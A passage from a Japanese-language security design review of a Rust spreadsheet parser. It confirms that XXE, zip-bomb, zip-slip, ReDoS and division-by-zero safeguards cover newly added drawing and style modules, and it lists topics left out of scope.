+* **XXE・Zip Bomb・Zip Slipの緩和が新規モジュール全てにきれいに拡張されている** ([`parse/drawing.md`](../design/parse/drawing.md)、[`parse/styles.md`](../design/parse/styles.md)、[`pipeline.md`](../design/pipeline.md)フェーズ3.5): 新設された2つの`parse/`モジュールはいずれも`Reader`を`create_secure_reader`経由でのみ構築し、イベントを`read_event`経由でのみ読む(各ファイル自身の「主要な型」コードとエラー処理方針節で確認済み——`drawing.md`は「構文的に不正なXMLは、他の`parse/`モジュールと同じ`create_secure_reader`/`read_event`ゲートウェイを経由して`Error::XmlParse`/`Error::ZipBombDetected`/`Error::DoctypeRejected`に変換される」と明示しており、`styles.md`も同様)。`pipeline.md`のフェーズ3.5は、他の全てのOPCパーツと同じ`container::get_entry`/`parse::parse_relationships`ゲートウェイを通じて`drawingN.xml`/`drawingN.xml.rels`を特定・読み込み、`Internal`な画像ターゲットの存在のみを`container::ZipContainer::has_entry`経由でチェックする(バイト列を一切読まない呼び出し元のために、不要な`get_entry`/`BoundedReader`構築を避ける目的で追加された)——`validate_entry_path`による再検証を一度も迂回しない。並行する、より緩い読み取り経路を記述・示唆する新しい設計文書は見つからなかった。
+* **`resolve_grouped_pic`の`chExt=0`除算ゼロガード** ([`parse/drawing.md`](../design/parse/drawing.md)エラー処理方針、`src/parse/drawing.rs`の`resolve_grouped_pic`で確認済み): 本レビューが確認を求められていた数値安全性チェックそのもの——`scale_x = ext_cx / ch_ext_cx`は、`ch_ext_cx == 0 || ch_ext_cy == 0`に対する明示的な`Error::InvalidPackage`によるfail-fastでガードされており、いずれの除算が実行される前にもチェックされる。「整形式だが意味を成さない数値を`NaN`/`Infinity`として静かに生成するのではなく拒否する」という本ファイルの一般的な方針と一貫している。
+* **前回レビューで指摘された日付書式ヒューリスティックのReDoS懸念は実装レベルで完全に解消されている** ([`parse/styles.md`](../design/parse/styles.md) `is_date_time_format`、オープンクエスチョン2; `docs/security/old/design-review.md` Finding 4): `src/parse/styles.rs::contains_date_time_token`で直接確認済み——バックトラッキングを一切伴わない`Chars`の単一パス走査(角括弧・引用符・バックスラッシュエスケープの処理はいずれも同じイテレータに対する前方のみの`for`ループであり、再走査は無い)であり、正規表現ではない。設計文書自身のオープンクエスチョン2は分類の*精度*(偽陽性/偽陰性率)についてのみ未解決のままであり、旧findingが提起した計算量の論点については解決済み——この解決を明示的に相互参照する短い注記を追加する価値はあるが、現存するリスクではない。
+* **`resolve::column_width`が結合セルfindingの教訓を、自身のアルゴリズムには必要無い箇所にも取り入れている** ([`resolve/column_width.md`](../design/resolve/column_width.md)「`resolve/merge.rs`との関係」および設計の経緯節): `resolve/column_width.rs`の1次元区間重複チェック自体にはO(N²)/O(N³)のリスクが無い(一度ソートして隣接ペアのみをチェックすれば十分)にもかかわらず、設計文書は`MAX_MERGE_REGIONS`が存在するのと同じ理由で件数上限(`MAX_COLUMN_WIDTH_RANGES = 2,000`)を明示的に設けている——「ファイル形式がそれを妨げないことと、それがタダで済むことは別問題」という、前回レビューサイクルの教訓を新規コードへ直接かつ理にかなった形で適用した例であり、まさにFinding 1が示すような防御的上限の考え方が、いまだ一律には適用されていないことの裏返しでもある。
+* **`parse/drawing.rs`と`parse/styles.rs`にわたる一貫したfail-closed/段階的縮退の使い分け** ([`parse/drawing.md`](../design/parse/drawing.md)、[`parse/styles.md`](../design/parse/styles.md)エラー処理方針節): 新設された2つのモジュールはいずれも、本プロジェクトの他所で既に確立された二層方針を適用している——本当に壊れた文書(必須要素の欠落、パース不能な数値属性、構文的に不正なXML)は型付きの`Error`でfail-fast拒否する。意味的には曖昧だが整形式な値(`styles.xml`内の解決不能な`numFmtId`/`fontId`/`fillId`/`theme`/`indexed`参照、画像を持たないアンカー)は、エラーにはせず文書化された既定値へ段階的に縮退する。いずれのモジュールも第3の、一貫性の無い方針を持ち込んでおらず、いずれも設計上不正な入力でパニックしない(各ファイルの明示的な「決してパニックしない」旨の記述に対して確認済み)。
+* **`Sheet::finalize_merges`のsweep-line修正は正しい層への正しい修正として妥当性を保っている** ([`model/sheet.md`](../design/model/sheet.md)「修正: `finalize_merges`」、[`resolve/merge.md`](../design/resolve/merge.md)オープンクエスチョン2の第2追記): 本レビューは、Issue #43の修正が`Sheet::get`/`iter_cells`の1セルあたりの解決コスト(実際のO(セル数×結合領域数)のハザード)を正しく標的にしたのであって、`resolve/merge.rs`自身の(既に上限のある)O(N²)検証ループではないことを再確認する(再検証はしない)。3つのより単純な、計測の上で却下された代替案(グローバルなカットオフ、行バケット化、区間木)を経てsweep lineへ着地したという設計文書自身の記録は、「推測せず計測する」という本プロジェクトの規律の良い手本であり、Finding 1はこれを今後グループ化画像のネストにも向けるべきことを示している。
+
+## 対象外
+
+* `quick-xml`・`zip`・`serde`/`serde_json`・`thiserror`のサプライチェーン/依存関係の脆弱性——前回までのレビューと同様、対象外。
+* セキュリティ上の意味を持たない純粋なコード品質・アーキテクチャ上の懸念(`Relationship.rel_type`を`enum`にすべきか、`model/workbook.md`の線形なシート名検索、MSRV方針等)——設計文書内にはこの種の未決事項がいくつか残っているが、いずれもZip Bomb/Zip Slip/XXE、攻撃者制御下の計算量、未検証の数値伝播、fail-closedの一貫性のいずれにも関わらないため、本レビューでは扱わない。
+* 前2回のレビューで既に解決され、それ以降変化していないfinding(XXEの`read_event`ゲート、Zip Bombの`SizeLimits`/`BoundedReader`、CSV/数式インジェクションのREADME警告、結合セルのO(N²)修正そのもの)は再検討しない——それぞれが新規追加モジュールにわたって引き続き健全であることをどう再確認したかは総合評価を参照(元の分析の繰り返しはしない)。
+* `docs/design/container/sanitize.md`オープンクエスチョン4(圧縮率に基づく早期スクリーニング)およびオープンクエスチョン5(エントリ名検証のallowlist方式かdenylist方式か)は、最初のレビューが残した状態のまま未解決であり、2026-08-17以降これらに関する新しい情報は無い——本レビューでは再評価しない。
+* `Image::hyperlink`がグループレベル(個々の画像単位だけでなく)のハイパーリンクも反映すべきか、`editAs`アンカー挙動属性、その他`parse/drawing.md`内の純粋な忠実性に関する未決事項——セキュリティ上の意味は無い。
+* `src/`の行単位の完全な監査は、この設計文書中心のレビューの対象外である(Finding 1は、設計文書自身の記述が上限の不在について検証可能な主張をしていたために、狙いを定めて実測した)。これは並行して行われている想定の、新規実装モジュールに対する専用のコードレベルレビューの代替にはならない。
